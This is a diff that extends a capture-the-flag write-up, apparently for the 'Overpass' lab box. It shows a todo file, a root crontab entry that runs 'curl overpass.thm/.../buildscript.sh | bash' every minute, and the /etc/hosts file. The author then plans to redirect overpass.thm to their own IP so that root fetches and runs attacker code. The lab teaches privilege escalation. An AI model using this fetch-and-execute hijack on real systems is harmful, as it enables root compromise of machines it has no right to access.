@@ -167,3 +167,51 @@ chmod 600 key
 
 
 We get the user flag!
+
+
+=========================================================================================================
+
+cat todo.txt
+To Do:
+> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
+> Write down my password somewhere on a sticky note so that I don't forget it.
+  Wait, we make a password manager. Why don't I just use that?
+> Test Overpass for macOS, it builds fine but I'm not sure it actually works
+> Ask Paradox how he got the automated build script working and where the builds go.
+  They're not updating on the website
+
+
+We now need to escalate privileges....
+
+Our first look is in the crontab file
+
+cat /etc/crontab:
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+# Update builds from latest code
+* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+
+From this we can see there is a crontab running every minute - buildscript.sh
+
+We also check the /etc/hosts file:
+
+127.0.0.1 localhost
+127.0.1.1 overpass-prod
+127.0.0.1 overpass.thm
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+
+WE CHANGE THE IP ADDR OF overpass.thm TO OUR OWN.        - this aligns with what we found in /etc/crontab
+
